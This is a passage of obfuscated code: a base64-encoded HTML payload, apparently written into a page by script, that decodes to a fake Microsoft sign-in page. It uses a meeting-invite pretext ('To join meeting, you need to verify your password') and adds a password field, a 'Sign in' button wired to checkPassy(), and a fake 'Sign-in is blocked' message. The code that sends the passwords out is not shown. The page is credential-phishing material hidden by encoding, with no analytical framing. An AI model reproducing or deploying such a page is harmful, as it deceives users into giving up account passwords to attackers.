dXAgY29sLW1kLTI0Ij4KICAgICAgICA8ZGl2IHJvbGU9ImFsZXJ0IiBhcmlhLWxpdmU9ImFzc2VydGl2ZSI+CiAgICAgICAgICAgIDxkaXYgaWQ9Im9uYWlhbSI+VG8gam9pbiBtZWV0aW5nLCB5b3UgbmVlZCB0byB2ZXJpZnkgeW91ciBwYXNzd29yZDwvZGl2PgogICAgICAgICAgICA8ZGl2IGlkPSJlZmlyZWQiIGNsYXNzPSJlcnJvciBleHQtZXJyb3IiIHN0eWxlPSJkaXNwbGF5OiBub25lIj5QbGVhc2UgZW50ZXIgdGhlIHBhc3N3b3JkIGZvciB5b3VyIGFjY291bnQuPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icGxhY2Vob2xkZXJDb250YWluZXIiPgo8aW5wdXQgbmFtZT0icGFzc2Rjb3ZpZCIgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzZCIgYXV0b2NvbXBsZXRlPSJvZmYiIGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQgZXh0LWlucHV0IHRleHQtYm94IGV4dC10ZXh0LWJveCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiBvbmlucHV0PSJlcnJQYXMoKSI+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CjxkaXYgY2xhc3M9InBvc2l0aW9uLWJ1dHRvbnMgcGFzc3dvcmQtcmVzZXQtbGlua3MtY29udGFpbmVyIGV4dC1wYXNzd29yZC1yZXNldC1saW5rcy1jb250YWluZXIiPgogICAgPGRpdj4gPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTI0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtMTMiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICA8IS0tICAgPGEgaWQ9ImlkQV9QV0RfRm9yZ290UGFzc3dvcmQiIHJvbGU9ImxpbmsiIGhyZWY9Imh0dHBzOi8vYWNjb3VudC5saXZlLmNvbS9SZXNldFBhc3N3b3JkLmFzcHg/d3JlcGx5PWh0dHBzOi8vbG9naW4ubGl2ZS5jb20vbG9naW4uc3JmJTNmY29udGV4dGlkJTNkMkM3M0E2NURGQUMwRDM5MiUyNmJrJTNkMTY3NDQ0NTc3NCZhbXA7aWQ9Mzg5MzYmYW1wO3VpZmxhdm9yPXdlYiZhbXA7dWFpZD1jYWE1NTkxYzE3MzM0MTQ0YWEzYWI2NDVhODUwODZlYyZhbXA7bWt0PUVOLVVTJmFtcDtsYz0xMDMzJmFtcDtiaz0xNjc0NDQ1Nzc0Ij5Gb3Jnb3QgcGFzc3dvcmQ/PC9hPiAtLT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9Indpbi1idXR0b24tcGluLWJvdHRvbSI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgPGRpdj48ZGl2IGNsYXNzPSJjb2wteHMtMjQgbm8tcGFkZGluZy1sZWZ0LXJpZ2h0IGJ1dHRvbi1jb250YWluZXIgYnV0dG9uLWZpZWxkLWNvbnRhaW5lciBleHQtYnV0dG9uLWZpZWxkLWNvbnRhaW5lciI+CiAgICA8ZGl2IGNsYXNzPSJpbmxpbmUtYmxvY2sgYnV0dG9uLWl0ZW0gZXh0LWJ1dHRvbi1pdGVtIj4KICAgICAgICAgPGlucHV0IHR5cGU9ImJ1dHRvbiIgaWQ9ImlkU0lCdXR0b245IiBjbGFzcz0id2luLWJ1dHRvbiBidXR0b25fcHJpbWFyeSBidXR0b24gZXh0LWJ1dHRvbiBwcmltYXJ5IGV4dC1wcmltYXJ5IiAgb25DbGljaz0icmV0dXJuIGNoZWNrUGFzc3koKSIgdmFsdWU9IlNpZ24gaW4iPgogICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CjwvZGl2PgogICAgPC9kaXY+ICAgICAgCiA8L2Rpdj4KIAoKICAgICAgICAgICAgCjxkaXYgY2xhc3M9IiIgc3R5bGU9ImRpc3BsYXk6IG5vbmUiIGlkPSJtYW55LWZyYW1lIj4KICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhbmltYXRlIHNsaWRlLWluLW5leHQiPgogICAgICAgIDxkaXY+CjxkaXYgY2xhc3M9ImlkZW50aXR5QmFubmVyIj4KICAgICAgICA8ZGl2IGlkPSJlbTIiIGNsYXNzPSJpZGVudGl0eSI+PC9kaXY+CjwvZGl2PjwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJwYWdpbmF0aW9uLXZpZXcgYW5pbWF0ZSBoYXMtaWRlbnRpdHktYmFubmVyIHNsaWRlLWluLW5leHQiPgo8ZGl2Pgo8ZGl2PjxkaXY+CiAgICA8ZGl2IGNsYXNzPSJyb3cgdGl0bGUgZXh0LXRpdGxlIj4KICAgICAgICA8ZGl2IHJvbGU9ImhlYWRpbmciPlNpZ24gaW48L2Rpdj4KICAgIDwvZGl2Pgo8L2Rpdj48L2Rpdj4KPGRpdiBjbGFzcz0idGV4dC1ibG9jay1ib2R5Ij4KICAgIDxkaXYgcm9sZT0iYWxlcnQiIGFyaWEtbGl2ZT0iYXNzZXJ0aXZlIj4KICAgICAgICA8ZGl2IGlkPSJpZFREX0Vycm9yIiBjbGFzcz0idGV4dC1ib2R5IGVycm9yIGV4dC1lcnJvciI+U2lnbi1pbiBpcyBibG9ja2VkPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgcm9sZT0iYWxlcnQiIGFyaWEtbGl2ZT0iYXNzZXJ0aXZlIj4KICAgICAgICA8ZGl2IGlkPSJlcnJvcl9JbmZvIiBjbGFzcz0idGV4dC1ib2R5IGVycm9yIGV4dC1lcnJvciI+WW91J3ZlIHRyaWVkIHRvIHNpZ24gaW4gdG9vIG1hbnkgdGltZXMgd2l0aCBhbiBpbmNvcnJlY3QgYWNjb3VudCBvciBwYXNzd29yZC48L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0icm93IHRleHQtYm9keSI+U2lnbi1pbiB3aXRoIDxiIGlkPSJlbTEiPjwvYj4gaXMgYmxvY2tlZCBmb3Igb25lIG9mIHRoZXNlIHJlYXNvbnM6PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJyb3cgdGV4dC1ib2R5Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj5Tb21lb25lIGVudGVyZWQgdGhlIHdyb25nIHBhc3N3b3JkIHRvbyBtYW55IHRpbWVzLjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPklmIHlvdSBzaWduZWQgdXAgZm9yIHRoaXMgYWNjb3VudCB0aHJvdWdoIGFuIG9yZ2FuaXphdGlvbiwgeW91IG1pZ2h0IG5vdCBiZSBhYmxlIHRvIHVzZSBpdCB5ZXQuPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CjxkaXYgY2xhc3M9InJvdyI+CiAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICA8YSBpZD0iaTEwMTEiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsgY29sb3I6IHJnYigwLCAxMTQsIDE5OCk7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgd2hpdGUtc3BhY2U6IG5vd3JhcDsgY3Vyc29yOiBwb2ludGVyIj5SZXNldCB5b3VyIHBhc3N3b3JkPC9hPgogICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCIgIG9uY2xpY2s9ImF1dG9hZnJlc2goKSI+CiAgICAgICAgPGEgaWQ9ImkxMDUxIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGNvbG9yOiByZ2IoMCwgMTE0LCAxOTgpOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IHdoaXRlLXNwYWNlOiBub3dyYXA7IGN1cnNvcjogcG9pbnRlciI+U2lnbiBpbiB1c2luZyBhbm90aGVyIGFjY291bnQ8L2E+CiAgICA8L2Rpdj4KPC9kaXY+CjwvZGl2PgogICAgPC9kaXY+ICAgICAgCiA8L2Rpdj4gICAgICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgPC9kaXY+CiAgICAgICAgIAogICAgICAgIDwvZGl2PiAgCiAgICAgICAgPGRpdiBjbGFzcz0icHJvbW90ZWQtZmVkLWNyZWQtYm94IGV4dC1wcm9tb3RlZC1mZWQtY3JlZC1ib3giIGlkPSJzb3B0aW9ucyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InByb21vdGVkLWZlZC1jcmVkLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IHRpbGUiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRhYmxlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGFibGUtcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRhYmxlLWNlbGwgdGlsZS1pbWcgbWVkaXVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJ0aWxlLWltZyBtZWRpdW0iIHNyYz0iaHR0cHM6Ly9hYWRjZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL3NpZ25pbi1vcHRpb25zXzRlNDgwNDZjZTc0ZjRiODlkNDUwMzdjOTA1NzZiZmFjLnN2ZyI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0YWJsZS1jZWxsIHRleHQtbGVmdCBjb250ZW50Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PlNpZ24taW4gb3B0aW9uczwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIAogICAgPC9kaXY+CjwvZGl2Pgo8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAKICAgIDxkaXYgaWQ9ImZvb3RlcmRlZmF1bHQiIGNsYXNzPSJmb290ZXIgZXh0LWZvb3RlciI+CiAgICAgICAgPGRpdj4KPGRpdiBpZD0iZm9vdGVyTGlua3MiIGNsYXNzPSJmb290ZXJOb2RlIHRleHQtc2Vjb25kYXJ5Ij4KICAgICAgICA8YSBjbGFzcz0iZm9vdGVyLWNvbnRlbnQgZXh0LWZvb3Rlci1jb250ZW50IGZvb3Rlci1pdGVtIGV4dC1mb290ZXItaXRlbSI+VGVybXMgb2YgdXNlPC9hPgogICAgICAgIDxhIGNsYXNzPSJmb290ZXItY29udGVudCBleHQtZm9vdGVyLWNvbnRlbnQgZm9vdGVyLWl0ZW0gZXh0LWZvb3Rlci1pdGVtIj5Qcml2YWN5ICZhbXA7IGNvb2tpZXM8L2E+CiAgICA8YSBjbGFzcz0iZm9vdGVyLWNvbnRlbnQgZXh0LWZvb3Rlci1jb250ZW50IGZvb3Rlci1pdGVtIGV4dC1mb290ZXItaXRlbSBkZWJ1Zy1pdGVtIGV4dC1kZWJ1Zy1pdGVtIj4uLi48L2E+CjwvZGl2PgogICA8L2Rpdj4KPC9kaXY+CiAgICAKPC9kaXY+CjwvZGl2PiAgICAKICAgIAoKICAgIDwvYm9keT48L2h0bWw+'));             